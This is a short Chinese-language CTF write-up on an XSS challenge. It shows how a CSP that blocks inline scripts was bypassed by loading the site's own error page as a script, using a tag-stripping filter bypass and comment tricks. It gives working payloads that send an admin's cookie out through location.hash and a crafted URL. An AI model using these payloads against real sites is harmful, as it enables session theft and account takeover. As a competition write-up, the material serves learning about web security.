刚开始搞错题目意思，一直以为是管理员后台不停刷新 show 页面，没理解那个发 url 的意思，一直都是发的 `<a>` 标签没任何反馈。
似乎木有啥过滤的 XSS，不过有 CSP 不能执行 inline 的 script，于是乎想到引用页面本身，把 html 当做 js。
然而语法因为用户名限制了字母和数字，`<br>` 那里要想语法不挂彩太难，晚上跟队友讲时突然想到其实本站内任何一个页面都行。
于是很容易发现 send 页面在用户名不存在时报错会把 reciever 和 content 打出来，还正好一前一后，于是通过注释轻松过 js 语法。

```
<scrscriptipt src="/html/index.php?action=send&to=*/alert(1)&content=/*"></scrscriptipt>
```

直接给自己发上面消息，然后进 show 页面可见直接 alert 成功。

然后企图构造 `document.location = 'xxx' + document.cookie` 发现 send 页面会把引号转义输出。
于是乎想了想，把字符串放 url 中，用 substr 取出来就好了，简单起见，可以放在 `#` 后面用 `location.hash` 取。
给自己发下面消息，然后进 show 页面即会自动跳转。

```
<scrscriptipt src="/html/index.php?action=send&to=*/document.location=location.hash.substr(1)%2bdocument.cookie&content=/*"></scrscriptipt>
```

最后把这条消息发给管理之后，给管理员发送下面 url 让管理员去访问，即可收到含 cookie 的消息，可见 flag。

```
http://202.120.7.136:8888/html/index.php?action=show#http://202.120.7.136:8888/html/index.php?action=send&to=ripples2&content=testfromadmin-
```

当然，应该是可以直接把这两条消息拼成一个 url 直接发给管理员就好了，不过既然已经过了就懒得搞了。

作为被 PWN400 卡死之余，无聊看看水过的题，越想越觉得甚是欣慰……
